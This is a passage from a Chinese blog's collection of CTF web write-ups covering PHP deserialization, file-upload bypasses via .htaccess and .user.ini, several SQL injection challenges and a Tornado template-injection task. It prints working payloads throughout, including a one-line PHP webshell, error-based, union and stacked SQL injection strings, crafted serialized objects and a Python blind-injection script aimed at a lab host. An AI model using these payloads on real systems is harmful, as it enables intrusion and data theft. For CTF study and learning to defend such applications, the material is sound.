class="hljs-variable">$select</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;select&#x27;</span>];<br><br>  <span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">unserialize</span>(@<span class="hljs-variable">$select</span>);<br><br>  <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>class.php(经过删减)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br><br><span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br><br>​    <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br><br>​    <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>; &#125;<br><br> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>​    <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><br>  &#125;<br><br> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>​    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;<br><br>​      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;<br><br>​      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;<br><br>​      <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br><br>​      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;<br><br>​      <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br><br>​      <span class="hljs-keyword">die</span>();<br><br>​    &#125;<br><br>​    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br><br>​      <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br><br>​      <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><br>​    &#125;<span class="hljs-keyword">else</span>&#123;<br><br>​      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;<br><br>​      <span class="hljs-keyword">die</span>();<br></code></pre></td></tr></table></figure><p>&#96;</p><p>**在反序列化时，当前属性个数大于实际属性个数时，就会跳过__wakeup(),去执行___destruct<br>思路明确了</p><p>当password为100，username为admin时即可获得flag</p><p>故以get传参为跳板本地构造原始POC：</p><p>?select&#x3D;O:4:”Name”:2:{s:13:” Name username”;s:5:”admin”;s:13:” Name password”;s:3:100;}</p><p>?select&#x3D;O:4:”Name”:2:{s:13:” Name username”;s:5:”admin”;s:13:” Name password”;s:3:100;}<br>仍然不行  </p><p>可能空格没有被实体化  这里我们需要把空格写出来<br> 而空格的url编码是%00，下面构造我们的payload </p><p>?select&#x3D;O:4:”Name”:3 {s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;s:3:”100”;}</p><h2 id="网鼎杯-2020-青龙组-AreUSerialz（反序列化）"><a href="#网鼎杯-2020-青龙组-AreUSerialz（反序列化）" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz（反序列化）"></a>[网鼎杯 2020 青龙组]AreUSerialz（反序列化）</h2><p>构造POP链</p><p>不使用题目中原有的各个字段的protect属性，因为这样会使得序列化后的字符串出现不可打印字符，而题目中的is_valid()函数又会检验输入的字符串中是否有不可打印字符，因此，我们这里把protect属性修改为public。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span>=<span class="hljs-number">2</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;./flag.php&quot;</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br><br>  &#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>;<br><br><span class="hljs-variable">$str1</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$str1</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:10:”.&#x2F;flag.php”;s:7:”content”;N;}</p><p>payload： ?str&#x3D;O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:10:”.&#x2F;flag.php”;s:7:”content”;N;}</p><h1 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h1><h2 id="极客大挑战-2019-Knife-一句话木马、代码执行"><a href="#极客大挑战-2019-Knife-一句话木马、代码执行" class="headerlink" title="[极客大挑战 2019]Knife(一句话木马、代码执行)"></a>[极客大挑战 2019]Knife(一句话木马、代码执行)</h2><h5 id="Way1（代码执行）"><a href="#Way1（代码执行）" class="headerlink" title="Way1（代码执行）"></a>Way1（代码执行）</h5><p>显示 eval($_POST[“Syc”]);<br>POST: Syc&#x3D;var_dump(scandir(‘&#x2F;‘));—查看源代码 发现flag</p><h5 id="Way2（蚁剑）"><a href="#Way2（蚁剑）" class="headerlink" title="Way2（蚁剑）"></a>Way2（蚁剑）</h5><p>复制URL 密码：Syc  找flag文件</p><h2 id="MRCTF2020-你传你🐎呢-htaccess绕过"><a href="#MRCTF2020-你传你🐎呢-htaccess绕过" class="headerlink" title="[MRCTF2020]你传你🐎呢(.htaccess绕过)"></a>[MRCTF2020]你传你🐎呢(.htaccess绕过)</h2><p>随便上传，有限制 尝试了php3,php5,ptml,空格绕过,都不行</p><p>先上次1.png   &#x2F;&#x2F;与后面的png文件名一致</p><p>尝试.htaccess</p><p>内容：<br><code>&lt;FilesMatch &quot;1.png&quot;&gt;</code><br><code>SetHandler application/x-httpd-php</code><br><code>&lt;/FilesMatch&gt;</code></p><p>抓包&#x3D;&#x3D;&gt;Content-Type: image&#x2F;png</p><p>复制网址：&#x2F;upload&#x2F;731ae4223a74740c27bb86b66c482220&#x2F;<strong>.htaccess</strong></p><p>改为&#x2F;upload&#x2F;731ae4223a74740c27bb86b66c482220&#x2F;<strong>1.png</strong></p><p>踩坑：<em>这里要把.htaccess改为1.png，因为密码cmd是对应的1.png</em></p><h2 id="SUCTF-2019-CheckIn-user-ini绕过"><a href="#SUCTF-2019-CheckIn-user-ini绕过" class="headerlink" title="[SUCTF 2019]CheckIn(.user.ini绕过)"></a>[SUCTF 2019]CheckIn(.user.ini绕过)</h2><p>illegal suffix! 尝试不同文件上传 发现只有jpg回显回显&lt;? in contents!</p><p>看来只能是jpg 然后需要绕过 &lt;?  :<code>&lt;script language=&#39;php&#39;&gt;eval($_POST[&#39;shell&#39;]);&lt;scirpt&gt;</code></p><p>需要把jpg当做PHP文件执行，尝试.htaccess文件，然后还是不行： 回显exif_imagetype:not image!</p><p>这时想到**.user.ini**绕过：</p><p><code>GIF89a</code><br><code>auto_prepend_file=a.jpg</code>&#x2F;&#x2F;a.jpg要与上传的jpg文件名称相同</p><p>重新尝试：先.user.ini 后 a.jpg </p><p>蚁剑连接，注意最后是&#x2F;index.php———使用的是auto_prepend_file，在主文件之前就已经自动解析文件名了，所以index.php主文件在最后面，而不是a.jpg</p><h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><h2 id="极客大挑战-2019-BabySQL-双写绕过"><a href="#极客大挑战-2019-BabySQL-双写绕过" class="headerlink" title="[极客大挑战 2019]BabySQL(双写绕过)"></a>[极客大挑战 2019]BabySQL(双写绕过)</h2><p>会双写绕过就能过（其他按部就班）</p><h2 id="极客大挑战-2019-HardSQL-报错注入"><a href="#极客大挑战-2019-HardSQL-报错注入" class="headerlink" title="[极客大挑战 2019]HardSQL(报错注入)"></a>[极客大挑战 2019]HardSQL(报错注入)</h2><p>万能密码不管用。大写、</p><p><strong>^代替and，用（）代替空格，like代替等于号</strong></p><p>1’^(updatexml(1,(concat(0x7e,(database()),0x7e)),1))or’</p><p>1’^(updatexml(1,(concat(0x7e,select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(‘geek’)),0x7e)),1))o</p><p>1’^(updatexml(1,(concat(0x7e,(select(group_concat(id.username,password))from(‘geek.H4rDsq1’)),0x7e)),1))or’    </p><p>发现只有password</p><p>1’^(updatexml(1,(concat(0x7e,(select(group_concat(password))from(‘geek.H4rDsq1’)),0x7e)),1))or’</p><p>发现得到一半flag </p><p><strong>XPATH syntax error: ‘~flag{206c80d5-e513-4b65-9634-1c’</strong></p><p>使用right</p><p>1’^(updatexml(1,(concat(0x7e,(select(group_concat(right(password,32)))from(geek.H4rDsq1)),0x7e)),1))or’</p><p><strong>XPATH syntax error: ‘~0d5-e513-4b65-9634-1c01506c896a’</strong></p><p><strong>flag{206c80d5-e513-4b65-9634-1c01506c896a}</strong></p><h2 id="GXYCTF2019-BabySQli（临时数据）"><a href="#GXYCTF2019-BabySQli（临时数据）" class="headerlink" title="[GXYCTF2019]BabySQli（临时数据）"></a>[GXYCTF2019]BabySQli（临时数据）</h2><p>源码：search.php 得到 MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5<br>一看就是base32 得到 c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw&#x3D;&#x3D;<br>一看就是base64 得到 select * from user where username &#x3D; ‘$name’</p><p>username为注入点，有绕过&#x3D;&#x3D;&gt;fuzz一波</p><p>看admin的位置 测试了一下在2处</p><p>爆不了表  看了别人的wp</p><p>这里是插入一条临时的数据admin，密码为md5加密后的1，然后密码为1，就会自动登陆上了（猜测3列为密码）</p><p>upload：1’ union select 1,’admin’,’c4ca4238a0b923820dcc509a6f75849b’#</p><p>数据库为32位小写md5加密</p><h2 id="GYCTF2020-Blacklist（堆叠注入handler）"><a href="#GYCTF2020-Blacklist（堆叠注入handler）" class="headerlink" title="[GYCTF2020]Blacklist（堆叠注入handler）"></a>[GYCTF2020]Blacklist（堆叠注入handler）</h2><p>前言：</p><hr><pre><code class="hljs">handler命令查询规则    handler table_name open;handler table_name read first;handler table_name close;    handler table_name open;handler table_name read next;handler table_name close;</code></pre><p>如何理解？</p><pre><code class="hljs">    首先打开数据库，开始读它第一行数据，读取成功后进行关闭操作。    首先打开数据库，开始循环读取，读取成功后进行关闭操作。</code></pre><hr><p>发现黑名单</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-built_in">set</span>|<span class="hljs-type">prepare</span>|<span class="hljs-type">alter</span>|<span class="hljs-type">rename</span>|<span class="hljs-type">select</span>|<span class="hljs-type">update</span>|<span class="hljs-type">delete</span>|<span class="hljs-type">drop</span>|<span class="hljs-type">insert</span>|<span class="hljs-type">where</span>|<span class="hljs-type">\</span><br></code></pre></td></tr></table></figure><p>0’;show databases;#&#x3D;&#x3D;&gt;0’;show tables;#&#x3D;&#x3D;&gt;0’;show columns from<code>FlagHere</code>;#&#x3D;&#x3D;&gt;发现有flag</p><p>handler可以用</p><p>0’;handler FlagHere open;handler FlagHere read first;handler FlagHere close;<br>0’;handler FlagHere open;handler FlagHere read next;handler FlagHere close;</p><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World（布尔盲注-脚本）"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World（布尔盲注-脚本）" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World（布尔盲注-脚本）"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World（布尔盲注-脚本）</h2><p>输入’ &#x3D;&#x3D;&gt;bool(false)</p><p>盲猜布尔盲注</p><p>万能密码，存在过滤 fuzz一波</p><p>可知1是正确的回显，0是错误的回显</p><p>进行验证：</p><p>if((ascii(substr((select(flag)from(flag)),1,1))&#x3D;102),1,0)</p><p>可以把if语句里最后的0,1,替换进行验证判断正确和错误的回显</p><p>因为要遍历，要写脚本</p><p><code>import requests</code><br><code>import re</code></p><p><code>url=&#39;http://b34f42ae-9e41-48eb-b906-0c3ea32eadec.node4.buuoj.cn:81/index.php&#39;   #路径</code><br><code>buu=&#39;&#39;     #记录flag</code></p><p><code>for i in range(1,50):   #flag的字符数量</code><br>    <code>for j in range(32,140):   #可打印出得所有字符的asii码值</code><br>        <code>#构造payload，对flag的值进行遍历，i为位数，j为遍历集，&#123;0&#125;和&#123;1&#125;分别为占位指针，&#123;0&#125;对应i，&#123;1&#125;对应j</code><br>        <code>payload=&quot;if((ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))=&#123;1&#125;),1,0)&quot;.format(i,j)</code><br>        <code>data=&#123;&quot;id&quot;:payload&#125;     #构造参数对象</code><br>        <code>res=requests.post(url=url,data=data)       #请求</code><br>        <code>#进行验证和记录flag</code><br>        <code>if &#39;Hello, glzjin wants a girlfriend&#39; in res.text:</code><br>           <code>buu=buu+chr(j)</code><br>           <code>print(i)</code><br>           <code>print(buu)</code><br>           <code>break              #跳出一层循环</code></p><h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>SSTI就是服务器端模板注入(Server-Side Template Injection)，实际上也是一种注入漏洞。<br><a href="https://blog.csdn.net/Manuffer/article/details/120739989?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171378855216800188542056%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=171378855216800188542056&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-120739989-null-null.142%5Ev100%5Epc_search_result_base9&utm_term=SSTI&spm=1018.2226.3001.4187">https://blog.csdn.net/Manuffer/article/details/120739989?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171378855216800188542056%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=171378855216800188542056&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-120739989-null-null.142^v100^pc_search_result_base9&amp;utm_term=SSTI&amp;spm=1018.2226.3001.4187</a></p><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>网址里有参数<code>filename</code>和<code>filehash</code>推测这里flag应该是</p><p><code>filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(filename))</code>里面，filehash里<a href="https://so.csdn.net/so/search?q=hash&spm=1001.2101.3001.7020">hash</a>就是提示为md5的hash加密。</p><p><code>easy_tornado</code>可推测是<strong>服务器模板注入(SSTI)。</strong></p><p>&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;———-搜素百度得Tornado框架的附属文件<a href="https://so.csdn.net/so/search?q=handler&spm=1001.2101.3001.7020">handler</a>.settings中存在cookie_secret</p><p>得到  ‘cookie_secret’: ‘dde04648-84e9-4d88-a0ca-776a28f54c13’}</p><p>payload：&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;77a1d0572298d9f79da44fd36511802c</p>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
